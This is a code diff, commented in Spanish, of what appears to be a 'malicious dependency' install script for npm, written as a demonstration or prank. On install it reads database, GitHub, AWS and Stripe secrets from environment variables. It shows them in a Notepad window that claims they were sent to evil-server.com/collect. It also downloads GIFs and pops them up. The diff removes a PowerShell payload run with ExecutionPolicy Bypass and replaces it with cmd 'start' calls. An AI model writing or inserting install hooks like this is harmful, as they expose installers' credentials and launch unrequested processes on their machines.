@@ -12,7 +12,6 @@ const imageUrls = [
     "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
 ];
 
-// Abrir block de notas con mensaje
 function abrirNotepad() {
     const msg = [
         "=========================================",
@@ -22,10 +21,10 @@ function abrirNotepad() {
         "Has instalado una dependencia maliciosa.",
         "Tus variables de entorno fueron robadas:",
         "",
-        "  DB_PASSWORD        = " + (process.env.DB_PASSWORD || "(no encontrada)"),
-        "  GITHUB_TOKEN       = " + (process.env.GITHUB_TOKEN || "(no encontrada)"),
+        "  DB_PASSWORD        = " + (process.env.DB_PASSWORD        || "(no encontrada)"),
+        "  GITHUB_TOKEN       = " + (process.env.GITHUB_TOKEN       || "(no encontrada)"),
         "  AWS_SECRET_KEY     = " + (process.env.AWS_SECRET_ACCESS_KEY || "(no encontrada)"),
-        "  STRIPE_API_KEY     = " + (process.env.STRIPE_API_KEY || "(no encontrada)"),
+        "  STRIPE_API_KEY     = " + (process.env.STRIPE_API_KEY     || "(no encontrada)"),
         "",
         "Datos enviados a: evil-server.com/collect",
         "",
@@ -44,7 +43,6 @@ function abrirNotepad() {
     }).unref();
 }
 
-// Descarga con soporte a redirects y http/https
 function downloadImage(url, filename, redirects = 0) {
     return new Promise((resolve) => {
         if (redirects > 5) { resolve(); return; }
@@ -66,7 +64,7 @@ function downloadImage(url, filename, redirects = 0) {
     });
 }
 
-// Lanza slideshow con .ps1 en UTF-16 LE (requerido por Windows PowerShell 5.1)
+// Abre cada imagen con el visor predeterminado de Windows con delay entre cada una
 function lanzarSlideshow(filenames) {
     const validos = filenames.filter(f => {
         try { return fs.existsSync(f) && fs.statSync(f).size > 200; }
@@ -75,72 +73,20 @@ function lanzarSlideshow(filenames) {
 
     if (validos.length === 0) return;
 
-    const archivos = validos.map(f => f.replace(/\\/g, "\\\\")).join('","');
-
-    const psScript = `
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$files  = @("${archivos}")
-$idx    = 0
-
-$timer          = New-Object System.Windows.Forms.Timer
-$timer.Interval = 2000
-
-$timer.Add_Tick({
-    $f = $files[$script:idx % $files.Count]
-    $script:idx++
-    try {
-        $img = [System.Drawing.Image]::FromFile($f)
-        $W = 550; $H = 350
-        $x = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Width  - $W))
-        $y = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Height - $H))
-
-        $form = New-Object Windows.Forms.Form
-        $form.StartPosition   = "Manual"
-        $form.Location        = New-Object Drawing.Point($x, $y)
-        $form.Size            = New-Object Drawing.Size($W, $H)
-        $form.TopMost         = $true
-        $form.FormBorderStyle = "None"
-        $form.BackColor       = [Drawing.Color]::Black
-
-        $pb          = New-Object Windows.Forms.PictureBox
-        $pb.Image    = $img
-        $pb.Dock     = "Fill"
-        $pb.SizeMode = "StretchImage"
-        $form.Controls.Add($pb)
-        $form.Show()
-    } catch {}
-})
-
-$timer.Start()
-[System.Windows.Forms.Application]::Run()
-`;
-
-    const psFile = path.join(os.tmpdir(), "shopeasy_payload.ps1");
-
-    // UTF-16 LE con BOM — Windows PowerShell 5.1 lo requiere para leer correctamente
-    const bom     = Buffer.from([0xFF, 0xFE]);
-    const content = Buffer.from(psScript, "utf16le");
-    fs.writeFileSync(psFile, Buffer.concat([bom, content]));
-
-    spawn("powershell.exe", [
-        "-ExecutionPolicy", "Bypass",
-        "-NonInteractive",
-        "-File", psFile
-    ], {
-        detached: true,
-        stdio: "ignore",
-        windowsHide: false,
-    }).unref();
+    validos.forEach((f, i) => {
+        setTimeout(() => {
+            spawn("cmd", ["/c", "start", "", f], {
+                detached: true,
+                stdio: "ignore",
+                shell: false,
+            }).unref();
+        }, i * 1500);
+    });
 }
 
 (async () => {
-    // 1. Abrir block de notas con mensaje de compromiso
     abrirNotepad();
 
-    // 2. Descargar y mostrar imágenes
     const tmpDir    = os.tmpdir();
     const filenames = [];
 
@@ -152,6 +98,5 @@ $timer.Start()
 
     lanzarSlideshow(filenames);
 
-    // 3. Salir para que npm install termine
     process.exit(0);
 })();
